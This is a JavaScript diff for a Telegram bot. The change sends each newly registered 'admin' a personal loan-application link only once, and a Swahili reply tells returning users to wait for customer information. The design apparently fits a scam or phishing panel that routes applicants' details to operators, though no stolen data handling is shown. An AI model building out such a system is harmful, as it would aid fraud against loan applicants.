@@ -34,7 +34,8 @@ function loadAdmins() {
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || '',
-        status: rec.status || 'PENDING'
+        status: rec.status || 'PENDING',
+        welcomeSent: rec.welcomeSent ?? false
       }]));
     }
   } catch (err) {
@@ -102,20 +103,33 @@ async function initBot() {
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
-      if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
+      const existingAdmin = admins.get(chatId);
+
+      // Send welcome link only ONCE when bot is started for the first time
+      if (!existingAdmin || !existingAdmin.welcomeSent) {
+        admins.set(chatId, { 
+          authorized: true, 
+          paid: true, 
+          username, 
+          firstName, 
+          lastName, 
+          startedAt: existingAdmin?.startedAt || new Date(),
+          welcomeSent: true 
+        });
         saveAdmins();
+
+        const userLink = `${APP_URL}/?admin=${chatId}`;
+        const startMessage = `🤖 *BOT STARTED & READY*\n\n` +
+                             `👤 *User Info:*\n` +
+                             `• *Name:* ${firstName} ${lastName}\n` +
+                             `• *Username:* @${username}\n` +
+                             `• *Chat ID:* \`${chatId}\`\n\n` +
+                             `🔗 *Your Loan Application Link:*\n${userLink}`;
+
+        await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
+      } else {
+        await bot.sendMessage(chatId, `🟢 *Bot tayari iko hai.* Subiri taarifa za wateja.`, { parse_mode: 'Markdown' });
       }
-
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      const startMessage = `🤖 *BOT STARTED & READY*\n\n` +
-                           `👤 *User Info:*\n` +
-                           `• *Name:* ${firstName} ${lastName}\n` +
-                           `• *Username:* @${username}\n` +
-                           `• *Chat ID:* \`${chatId}\`\n\n` +
-                           `🔗 *Your Loan Application Link:*\n${userLink}`;
-
-      await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -335,4 +349,4 @@ app.listen(PORT, async () => {
     }
   }
 });
-  
+        
